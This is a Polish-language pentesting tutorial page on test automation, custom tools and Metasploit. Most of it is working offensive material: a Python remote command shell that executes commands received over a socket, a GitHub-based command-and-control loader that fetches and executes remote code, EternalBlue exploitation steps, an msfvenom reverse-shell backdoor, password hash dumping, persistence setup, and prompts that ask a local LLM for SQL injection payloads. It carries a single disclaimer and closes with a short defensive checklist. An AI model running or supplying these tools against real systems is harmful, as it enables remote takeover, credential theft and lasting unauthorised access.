---
id: "automatyzacja-eksploatacja"
title: "🤖 Automatyzacja i eksploatacja"
sidebar_position: 22
---

# 🤖 Automatyzacja i eksploatacja

Automatyzacja testów penetracyjnych pozwala zwiększyć efektywność pracy pentestera, eliminując powtarzalne zadania i przyspieszając proces wykrywania podatności. W tej sekcji omówimy, jak pisać własne skrypty do pentestów oraz jak skutecznie korzystać z **Metasploit Framework**.

---

## ⚙️ Automatyzacja testów penetracyjnych

### **1️⃣ Jak pisać własne skrypty do pentestów?**
Automatyzacja testów może obejmować:
- **Skanowanie sieci**
- **Automatyczne wykrywanie podatności**
- **Eksploatację znanych luk**
- **Analizę logów i danych zebranych podczas testów**

#### **1.1 Tworzenie skryptu w Pythonie do automatycznego skanowania Nmap**
```python
import os

target = input("Podaj adres IP lub domenę: ")
os.system(f"nmap -A -p- {target}")
```
Zapisz plik jako `scan.py` i uruchom:
```bash
python3 scan.py
```

#### **1.2 Automatyczne wyszukiwanie ukrytych katalogów w Bash**
```bash
#!/bin/bash
TARGET=$1
WORDLIST=/usr/share/wordlists/dirb/common.txt
echo "Skanowanie: $TARGET"
gobuster dir -u $TARGET -w $WORDLIST -x php,html,txt
```
Zapisz plik jako `dirscan.sh`, nadaj uprawnienia i uruchom:
```bash
chmod +x dirscan.sh
./dirscan.sh http://example.com
```

#### **1.3 Automatyczna analiza logów HTTP**
```python
with open("access.log", "r") as file:
    for line in file:
        if "admin" in line or "login" in line:
            print(line)
```

---

## 🐍 Własne narzędzia – Black Hat Python

Wrappery `os.system` to za mało. Black Hat Python demonstruje jak budować pełnowartościowe narzędzia pentesterskie od podstaw — to materiał kluczowy dla osób chcących wykraczać poza gotowe frameworki.

### **2️⃣ Zamiennik Netcata w Pythonie**
Gdy `nc` jest zablokowany lub usunięty z hosta, prosty zamiennik w Pythonie:

```python
import socket, subprocess, sys

def client_mode(host, port):
    s = socket.socket()
    s.connect((host, port))
    while True:
        cmd = s.recv(4096).decode()
        if cmd.lower() == 'exit\n':
            break
        result = subprocess.run(cmd, shell=True, capture_output=True)
        s.send(result.stdout + result.stderr)
    s.close()

def server_mode(port):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    conn, addr = s.accept()
    print(f"[+] Połączono: {addr}")
    while True:
        cmd = input('bhnet> ')
        conn.send((cmd + '\n').encode())
        if cmd == 'exit':
            break
        print(conn.recv(4096).decode(), end='')
    conn.close()

if __name__ == '__main__':
    if sys.argv[1] == '-l':
        server_mode(int(sys.argv[2]))
    else:
        client_mode(sys.argv[1], int(sys.argv[2]))
```

Użycie:
```bash
# Kali – listener
python3 bhnet.py -l 4444

# Cel – połącz się i wyślij shell
python3 bhnet.py 192.168.1.100 4444
```

### **3️⃣ C2 przez GitHub (GitImporter)**

Technika z Black Hat Python (rozdz. 9): agenty C2 mogą komunikować się przez publiczne repozytorium GitHub, co omija proste blokady sieciowe (GitHub jest często na allowliście):

```python
import sys, os, base64, github3, time

# GitImporter – dynamiczne ładowanie modułów z GitHub
class GitImporter:
    def find_module(self, name, path=None):
        if name in self.modules:
            return self
        return None

    def load_module(self, name):
        gh = github3.login(token=os.getenv('GITHUB_TOKEN'))
        repo = gh.repository('attacker', 'c2-modules')
        content = repo.file_contents(f'/{name}.py').decoded.decode()
        module = type(sys)(name)
        exec(compile(content, name, 'exec'), module.__dict__)
        sys.modules[name] = module
        return module
```

Agent co 30 sekund odpytuje repozytorium o nowe komendy (pliki `cmd_*.txt`) i wrzuca wyniki jako commity. Logika komunikacji jest w pełni asynchroniczna i nie utrzymuje otwartego połączenia.

> ⚠️ Powyższe techniki są materiałem edukacyjnym z książki Black Hat Python — stosuj wyłącznie w autoryzowanych środowiskach testowych.

---

## 🔥 Metasploit – podstawy i zaawansowane funkcje

Metasploit to jedno z najpotężniejszych narzędzi do eksploitacji systemów.

### **2️⃣ Podstawowe komendy w Metasploit**

#### **2.1 Uruchamianie Metasploit**
```bash
msfconsole
```

#### **2.2 Wyszukiwanie exploitów**
```bash
search smb
```

#### **2.3 Wybieranie exploita**
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

#### **2.4 Konfiguracja exploita**
```bash
set RHOSTS 192.168.1.10
set LHOST 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
```

#### **2.5 Uruchomienie ataku**
```bash
exploit
```

---

### **3️⃣ Zaawansowane techniki w Metasploit**

#### **3.1 Automatyczne wykrywanie podatności (db_nmap)**
```bash
db_nmap -A -p- 192.168.1.0/24
```

#### **3.2 Tworzenie backdoora w Metasploit**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe
```

#### **3.3 Post-Exploitation: Pobranie haseł**
Po uzyskaniu dostępu do systemu można spróbować przechwycić hasła:
```bash
meterpreter > hashdump
```

#### **3.4 Tworzenie persistent backdoor**
```bash
run persistence -X -i 10 -p 4444 -r 192.168.1.100
```
Dzięki temu po restarcie maszyny backdoor nadal będzie aktywny.

---

## 🆕 Nowe narzędzia automatyzacji w Kali 2026.1

### **4️⃣ AdaptixC2 – Framework Command & Control**

AdaptixC2 to nowoczesny framework C2 dedykowany emulacji grup APT, dostępny w Kali 2026.1:

```bash
# Uruchomienie serwera AdaptixC2
adaptixc2 server --config /etc/adaptixc2/config.yaml

# Podgląd aktywnych agentów
adaptixc2 client --connect 127.0.0.1:8080
```

Zastosowania: symulacja kampanii APT, testowanie mechanizmów detekcji EDR/SIEM.

---

### **5️⃣ Atomic-Operator – Testy zgodne z MITRE ATT&CK**

Atomic-Operator automatyzuje testy jednostkowe oparte na bazie **MITRE ATT\&CK**, co pozwala weryfikować czy systemy detekcji (SIEM, EDR) prawidłowo reagują na znane techniki ataku:

```bash
# Instalacja
pip3 install atomic-operator

# Uruchomienie konkretnej techniki ATT&CK
atomic-operator run --atomics-path /opt/atomic-red-team/atomics \
  --technique T1059.004

# Lista dostępnych technik
atomic-operator list
```

Przykładowe techniki:
- `T1059.004` – Command and Scripting: Unix Shell
- `T1003.001` – OS Credential Dumping: LSASS Memory
- `T1566.001` – Phishing: Spearphishing Attachment

---

## 🤖 AI i LLM w testach penetracyjnych

Kali 2026.1 oficjalnie wchodzi w erę **Private AI** — modele językowe działają lokalnie, bez wysyłania wrażliwych danych klienta do zewnętrznych serwisów.

### **6️⃣ Lokalne LLM z Ollama**

```bash
# Instalacja Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Pobranie modelu (np. llama3 lub mistral)
ollama pull llama3

# Generowanie komend pentesterskich
ollama run llama3 "Wygeneruj komendę nmap do wykrycia otwartych portów i wersji usług na 192.168.1.0/24"
```

### **6.1 Przykłady zastosowań AI w pentestach**

```bash
# Analiza kodu pod kątem podatności
cat webapp.py | ollama run codellama "Znajdź podatności bezpieczeństwa w tym kodzie"

# Generowanie payloadów SQLi dla konkretnego kontekstu
ollama run mistral "Wygeneruj payloady SQL Injection dla MySQL, kontekst: pole 'username' w formularzu logowania"

# Pomoc w analizie odpowiedzi HTTP
curl -s https://target.example.com | ollama run llama3 "Przeanalizuj te nagłówki HTTP pod kątem problemów bezpieczeństwa"
```

### **6.2 5ire – Platforma AI dla pentesterów**

5ire to **desktopowy klient AI** (aplikacja GUI z obsługą MCP), nie narzędzie CLI. Łączy się z lokalnymi modelami przez Ollama oraz z zewnętrznymi API. Po instalacji w ustawieniach wskazujesz endpoint Ollama (`http://localhost:11434`) i wybierasz model (np. `llama3`). Dzięki obsłudze **MCP (Model Context Protocol)** można podłączać narzędzia i konteksty pentesterskie do modelu.

> ⚠️ **Ważne:** Nawet przy lokalnych modelach — nigdy nie wklejaj do LLM prawdziwych danych uwierzytelniających, haseł ani danych osobowych klientów.

---

## 🔐 Jak zabezpieczyć się przed automatycznymi atakami AI?
✅ **Monitorowanie ruchu sieciowego i nietypowych skanowań**
✅ **Blokowanie narzędzi typu Metasploit w systemach produkcyjnych**
✅ **Regularne aktualizacje systemów i patchowanie znanych podatności**
✅ **Wykrywanie i blokowanie backdoorów za pomocą EDR (Endpoint Detection & Response)**
✅ **Wdrożenie systemów detekcji behawioralnej zdolnych do wykrywania technik ATT&CK (MITRE D3FEND)**
✅ **Monitorowanie nietypowych wzorców poleceń wskazujących na automatyzację AI**

---

Automatyzacja i Metasploit to kluczowe narzędzia w arsenale pentestera. Kolejnym krokiem będzie **Reverse Shell i Post-Exploitation**! 🚀
